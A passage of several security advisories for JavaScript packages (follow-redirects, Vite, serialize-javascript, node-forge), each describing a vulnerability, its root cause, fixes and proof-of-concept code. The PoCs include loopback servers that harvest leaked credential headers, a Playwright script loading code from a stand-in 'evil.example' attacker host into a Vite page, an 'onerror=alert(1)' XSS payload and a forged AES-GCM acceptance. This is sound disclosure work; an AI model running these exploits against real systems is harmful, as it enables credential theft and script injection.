Observed output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.

Side-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.

### Impact
This is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.

1242605.overview:
### Summary
follow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.

### Details
The filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:

```js
this._headerFilter = new RegExp("^(?:" +
    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join("|") +
  ")$", "i");
```

`escapeRegex` at `index.js:703-705`:

```js
function escapeRegex(regex) {
  return regex.replace(/[\]\\/()*+?.$]/g, "\\$&");   // escapes ] \ / ( ) * + ? . $  -- NOT ^ | [ { }
}
```

The character class escapes `]`, `\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.

For a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:

- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test("X-Api^Key")` returns `false`, and the header is not stripped.
- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.

The generated filter source, reproduced from the exact library logic, is:
```
^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$
```
Direct matching results against this filter: `X-Api^Key` -> false, `X-Token|Secret` -> false, `X-Control-Key` (normal name) -> true, and the split-off `X-Token` -> true and `Secret` -> true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -> true.

Secondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.

Suggested remediation: two changes close both facets.

1. Escape the complete set of regular-expression metacharacters:
```js
function escapeRegex(str) { return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
```
This was verified to restore correct matching for all affected names while preserving the built-in matches.

2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.

Additionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653
- https://github.com/follow-redirects/follow-redirects/pull/284
- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9

### PoC
Environment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require("./index.js")` resolves to the library under test.

Facet 1, metacharacter header names, `leak.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:45902/" });   // cross-origin (different port)
  res.end();
});
var collector = http.createServer(function (req, res) {
  res.end(JSON.stringify(req.headers));                          // attacker-controlled target
});
redirector.listen(45901, "127.0.0.1", function () {
  collector.listen(45902, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 45901, path: "/",
      headers: {
        "X-Api^Key":      "SECRET-LEAKED-1",     // declared sensitive, name contains ^
        "X-Token|Secret": "SECRET-LEAKED-2",     // declared sensitive, name contains |
        "X-Control-Key":  "SHOULD-BE-STRIPPED",  // declared sensitive, normal name (control)
        "Authorization":  "Bearer BUILTIN-CTL"   // built-in list (control)
      },
      sensitiveHeaders: ["X-Api^Key", "X-Token|Secret", "X-Control-Key"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("X-Api^Key      :", h["x-api^key"] || "(stripped)");
        console.log("X-Token|Secret :", h["x-token|secret"] || "(stripped)");
        console.log("X-Control-Key  :", h["x-control-key"] || "(stripped - OK)");
        console.log("Authorization  :", h["authorization"] || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0):
```
X-Api^Key      : SECRET-LEAKED-1          <- credential LEAKED to redirect target
X-Token|Secret : SECRET-LEAKED-2          <- credential LEAKED to redirect target
X-Control-Key  : (stripped - OK)          <- control: option works for normal names
Authorization  : (stripped - OK)          <- control: built-in list works
```
The two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.

Root-cause and fix verification (pure regex logic, no network):
```js
var builtin = ["Authorization", "Proxy-Authorization", "Cookie"];
function escCurrent(s) { return s.replace(/[\]\\/()*+?.$]/g, "\\$&"); }         // library's escaper
function escFixed(s)   { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }      // canonical escaper
function build(esc, d) { return new RegExp("^(?:" + builtin.concat(d).map(esc).join("|") + ")$", "i"); }
var declared = ["X-Api^Key", "X-Token|Secret", "X-Control-Key"];
var cur = build(escCurrent, declared), fix = build(escFixed, declared);
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("current", n, cur.test(n)));  // both false
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("fixed  ", n, fix.test(n)));  // both true
["X-Token","Secret"].forEach(n => console.log("collateral", n, cur.test(n)));         // both true (wrong)
```
Observed: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.

Reachability of the vectors:
```
node -e 'var http=require("http");["X-A^B","X-A|B","X-A[B","X-A{B","X-A}B"].forEach(function(n){try{var r=http.request({host:"127.0.0.1",port:1});r.setHeader(n,"v");r.destroy();console.log(n,"ACCEPTED");}catch(e){console.log(n,"REJECTED",e.code);}});'
```
Observed: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.

Facet 2, entry declared inside `beforeRedirect`, `leak2.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  res.writeHead(302, { Location: "http://127.0.0.1:46202/" }); res.end();
});
var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
redirector.listen(46201, "127.0.0.1", function () {
  collector.listen(46202, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 46201, path: "/",
      headers: { "X-Late": "LATE-DECLARED-VALUE" },
      beforeRedirect: function (options) { options.sensitiveHeaders.push("X-Late"); }
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; }); res.on("end", function () {
        console.log("X-Late forwarded to redirect target:", JSON.parse(body)["x-late"] || "(stripped)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).

### Impact
This is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.

1242728.overview:
### Summary

When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.

### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions

### Details

[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.

Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.

[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.

### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

1243082.overview:
### Impact

`serialize-javascript` escapes its output so it is safe to embed inside a
`<script>` element. Before 7.1.3 that guarantee did not hold for a **function
value whose source ends in a bare `</script`**.

Each function body is escaped on its own, and a bare `</script` was only
neutralized when followed — within the same body — by a character the HTML
tokenizer treats as ending the tag name (TAB, LF, FF, CR, SPACE, `/` or `>`).
A body ending exactly at `</script` has no following character, so it was
emitted unescaped. The delimiter is then supplied by the surrounding output
(for example the newline the `space` option emits after the value), and a
later serialized value can supply the closing `>` followed by markup:

```js
const serialize = require('serialize-javascript');
function f() {} f.toString = () => 'function f(){ return 1 }//</script';
function g() {} g.toString = () => 'function g(x){ return x } > <img src=x onerror=alert(1)>';
serialize({ a: { f }, g }, { space: 2 });
// {
//   "a": {
//     "f": function f(){ return 1 }//</script
//   },
//   "g": function g(x){ return x } > <img src=x onerror=alert(1)>
// }
```

Embedded in a `<script>` element, the script ends at the injected tag and the
`<img>` becomes a live element in the page.

Exploitation requires an attacker to control the **source text** of a
serialized function, in practice through a spoofed `toString()`. Real
functions always end in `}`, so ordinary function values are not affected,
and non-function values (including strings containing `</script`) are
escaped correctly.

### Patches

Fixed in **7.1.3** (#235). The bare `</script` form is now also matched at
the end of the function body, so it is escaped regardless of what follows it
in the output.

### Workarounds

Upgrade to **7.1.3**. If you cannot upgrade, do not serialize function values
whose source text (or `toString()`) can be influenced by an attacker.

### Credits

Reported by **ha_kr25** via the Yahoo bug bounty program.

1244019.overview:
### Summary

When a CA store created by `pki.createCaStore()` holds two or more certificates with the same subject name, `pki.verifyCertificateChain()` permanently removes those certificates from the store while trying each one as the issuer. A peer can send any certificate that names that subject as its issuer to make all later verifications against those CA certificates fail. Fixed in node-forge 1.4.1.

### Details

`pki.verifyCertificateChain()` (`lib/x509.js`) asks the CA store for the issuer of each certificate with `caStore.getIssuer()`. When the store holds several certificates with the same subject, `caStore.getIssuer()` returns the store's own internal array of those certificates (`caStore.certs[hash]`, built by `addCertificate()`). `verifyCertificateChain()` used that array directly as its list of candidate parents and called `parents.shift()` on it while trying each candidate. Every candidate it tried, including the one that finally verified the certificate, was removed from the store.

Once the array is empty, `getIssuer()` returns an empty list, no candidate is tried, and verification fails with "Certificate signature is invalid." `hasCertificate()` and `listAllCertificates()` no longer see the removed certificates. The store stays in this state for as long as the object is used.

The attacker's certificate only needs an issuer name equal to the shared subject name, which is public. Its signature and key can be arbitrary: every candidate is tried and shifted out because none verifies, and errors from `parent.verify()` are caught by the loop. Verification of the attacker's chain fails as expected. Verifying valid chains has a similar effect: the CA certificate that verified the chain and any tried before it are removed.

No chain is accepted that should be rejected. Removing candidates can only turn a success into a failure.

RFC 5280, Section 6.1.1(d) treats trust anchor information as an input to path validation. Validation should not consume it.

The fix copies the array returned by `getIssuer()` before iterating over it, so the CA store is no longer modified. `getIssuer()` itself is unchanged.

### Patches
Fixed in node-forge 1.4.1. `pki.verifyCertificateChain()` now works on a copy of the candidate issuer list instead of shifting entries out of the CA store.

### Workarounds
- Pass a fresh CA store to each `pki.verifyCertificateChain()` call (for example `pki.createCaStore(trustedCerts)`), or pass `caStore` to `forge.tls.createConnection()` as an array of certificates instead of a store object, so that forge creates a new store per connection.
- Or wrap the store so that `getIssuer()` returns a copy:

      var getIssuer = caStore.getIssuer;
      caStore.getIssuer = function(cert) {
        var r = getIssuer(cert);
        return Array.isArray(r) ? r.slice() : r;
      };

### Proof of concept

Two trusted self-signed CA certificates, `rootA` and `rootB`, share the subject `CN=Root`. `bogus` is any certificate whose issuer is `CN=Root`, signed with an unrelated key. `leafA` is a valid certificate issued by `rootA`.

    var caStore = forge.pki.createCaStore([rootA, rootB]);
    caStore.listAllCertificates().length;  // 2
    try { forge.pki.verifyCertificateChain(caStore, [bogus]); } catch(e) {}
    // rejected as expected ("Certificate signature is invalid.")
    caStore.listAllCertificates().length;  // 0: both CA certificates are gone
    forge.pki.verifyCertificateChain(caStore, [leafA]);
    // throws "Certificate signature is invalid." (valid chain now rejected)

Without the attacker certificate, verifying `leafA` twice against a fresh store gives the same result: the first call succeeds and removes `rootA`, the second fails. With the fix, the store keeps both certificates and every valid chain verifies. The regression tests are in `tests/unit/x509.js` ("CA store" section).

### Impact

Applications that keep a long-lived CA store holding several trusted certificates with the same subject name, and that verify certificate chains received from other parties with `pki.verifyCertificateChain()`. This includes `forge.tls` clients that pass the same `caStore` object to several connections. Duplicate subject names occur with re-keyed or renewed CAs that kept their name, or a CA next to a cross-signed version of itself, mostly in private PKIs.

A remote, unauthenticated peer (for example a malicious TLS server or a party submitting a signed document) can send a certificate naming the shared subject as its issuer. This removes every certificate with that subject from the store, so later verifications of valid chains issued by those CA certificates fail until the store is recreated. This is a persistent denial of service for certificate verification against those CA certificates. Verification against other trusted CAs keeps working, no invalid chain is accepted, and stores without duplicate subject names are not affected.

1244020.overview:
### Summary

The AES-GCM mode in forge.cipher does not validate the tagLength option passed to start(). With a tagLength of 0 or a value that converts to 0 (such as null, false, '' or '0'), the authentication tag is empty, and decipher.finish() returns true for any ciphertext and additional data when the supplied tag is empty or missing. Fixed in node-forge 1.4.1.

### Details

`modes.gcm.prototype.start()` in `lib/cipherModes.js` stored the `tagLength` option without validation, and `lib/cipher.js` documented it as accepting "0-128". After processing the data, `afterFinish()` truncates the 16-byte tag with `truncate(16 % (tagLength / 8))`. For a `tagLength` that converts to 0, this is `16 % 0 = NaN`, and truncating by `NaN` empties the tag. On decryption, the start-time check that the supplied `tag` has `tagLength / 8` bytes passes for an empty tag, and the final tag comparison compares two empty strings, so `decipher.finish()` returns `true` for any ciphertext and additional data.

NIST SP 800-38D section 5.2.1.2 allows only tag lengths of 128, 120, 112, 104 and 96 bits, plus 64 and 32 bits for certain applications.

The fix validates `tagLength` in `start()`, for both encryption and decryption. A missing, `null` or `undefined` `tagLength` uses the default of 128 bits. Any other value is converted with `Number()` and must be one of 128, 120, 112, 104, 96, 64 or 32; otherwise `start()` throws "Invalid tag length.". Numeric strings such as `'128'` are still accepted. With a validated `tagLength`, an empty tag no longer matches the expected tag length and is rejected.

### Patches
Fixed in node-forge 1.4.1. `cipher.start()` now throws an error unless `tagLength` is one of the tag lengths allowed by NIST SP 800-38D (128, 120, 112, 104, 96, 64 or 32 bits); a `null` or `undefined` `tagLength` means the default of 128 bits.

### Workarounds
Do not derive `tagLength` from received data. Pass a fixed `tagLength` (or omit it to use the default of 128 bits), and check that the received tag has the expected length before calling `start()`, for example `if(tag.length !== 16) { throw new Error('Invalid tag.'); }` before `decipher.start({iv: iv, tag: tag});`.

### Proof of concept

Start an AES-GCM decipher with `tagLength: 0` and an empty tag, as an application does when it derives the tag length from a received empty tag, and feed it arbitrary bytes that were never encrypted under the key:

```js
var decipher = forge.cipher.createDecipher('AES-GCM', key);
decipher.start({iv: iv, tag: '', tagLength: 0});
decipher.update(forge.util.createBuffer('any attacker-chosen bytes'));
decipher.finish();
// <= 1.4.0: true
// 1.4.1: start() throws "Invalid tag length."
```

`tagLength` values `null`, `false` and `'0'` (with an empty tag), and `tagLength: 0` with no `tag` option, give the same result on <= 1.4.0. The fix adds regression tests in `tests/unit/aes.js`.

### Impact

Applications that decrypt AES-GCM data with `forge.cipher.createDecipher()` (`'AES-GCM'`) and pass a zero-like `tagLength` are affected. Typical cases are a tag length derived from the received tag, or an unset configuration value:

```js
var decipher = forge.cipher.createDecipher('AES-GCM', key);
decipher.start({iv: iv, tag: receivedTag, tagLength: receivedTag.length * 8});
decipher.update(forge.util.createBuffer(receivedCiphertext));
if(decipher.finish()) { /* attacker-supplied data accepted */ }
```

An attacker who can send a ciphertext with an empty tag to such an application can make it accept attacker-chosen ciphertext as authentic. Because GCM encryption is a stream cipher, an attacker who knows (part of) a captured message's plaintext can also change that plaintext to chosen values. The default (no `tagLength` option, 128 bits) and any fixed valid `tagLength` are not affected.
